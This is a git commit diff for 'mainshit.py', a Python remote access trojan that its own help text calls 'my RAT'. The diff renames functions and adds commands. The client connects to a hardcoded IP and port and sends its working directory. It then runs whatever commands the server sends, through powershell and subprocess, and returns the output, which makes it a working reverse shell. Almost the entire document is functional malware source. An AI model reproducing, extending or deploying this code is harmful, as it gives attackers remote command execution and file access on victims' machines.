afca599ffaa766cc9ffde8b9cdb3e2048e182605
Mmeddes <118391875+Mmeddes@users.noreply.github.com>
2023-01-31 18:32:47 +0200

    Update mainshit.py

--- mainshit.py
+++ mainshit.py
@@ -4,7 +4,7 @@ import subprocess
 import os
 
 
-class client_class:
+class ClientClass:
 
     def __init__(self, ip, port):
         self.ip = ip
@@ -18,45 +18,77 @@ class client_class:
             global client
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((self.ip, self.port))
-            client.send(self.curdir.encode())
+            firstmassage = f'\n{self.curdir} >> '
+            client.send(firstmassage.encode())
         except Exception as error:
             print(error)
 
-
-    def cmd(self):
+    def cexe(self):
         while True:
-            # receive the command from the server
+            # receive the commands
             command = client.recv(self.BUFFER_SIZE).decode()
             splited_command = command.split()
-            if command.lower() == "exit":
-                # if the command is exit, just break out of the loop
-                break
-            if splited_command[0].lower() == "cd":
+
+            if splited_command[0].lower() == "exit":
+                client.close()
+
+            elif splited_command[0].lower() == "man":
+                output = """
+                man page for my RAT:
+                exit - Exit Shell
+                cd - Change Directory
+                ls - List Directory
+                pwd - Working Directory
+                cat - Show file content
+                """
+            elif splited_command[0].lower() == "cd":
                 # cd command, change directory
                 try:
                     os.chdir(' '.join(splited_command[1:]))
-                except FileNotFoundError as error:
+                except Exception as error:
                     # if there is an error, set as the output
                     output = str(error)
                 else:
                     # if operation is successful, empty message
                     output = ""
+
+            elif splited_command[0].lower() == "ls":
+                output = subprocess.check_output(['powershell.exe',
+                                                  'ls'],
+                                                 encoding='utf-8')
+
+            elif splited_command[0].lower() == "pwd":
+                output = subprocess.check_output(['powershell.exe',
+                                                  'pwd'],
+                                                 encoding='utf-8')
+
+            elif splited_command[0].lower() == "cat":
+                try:
+                    output = subprocess.check_output(['powershell.exe',
+                                                      'cat',
+                                                      ' '.join(splited_command[1:])],
+                                                     encoding='utf-8')
+                except Exception as error:
+                    output = str(error)
+                    pass
+
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
+
             # get the current working directory as output
             cwd = os.getcwd()
             # send the results back to the server
-            message = f"{output}{self.SEPARATOR}{cwd} > "
+            message = f"{output}{self.SEPARATOR}{cwd} >> "
             client.send(message.encode())
         # close client connection
         client.close()
 
 
-rat = client_class('10.211.55.7', 5555)
+rat = ClientClass('10.211.55.7', 5555)
 
 
 if __name__ == '__main__':
     rat.connection()
-    rat.cmd()
+    rat.cexe()
 
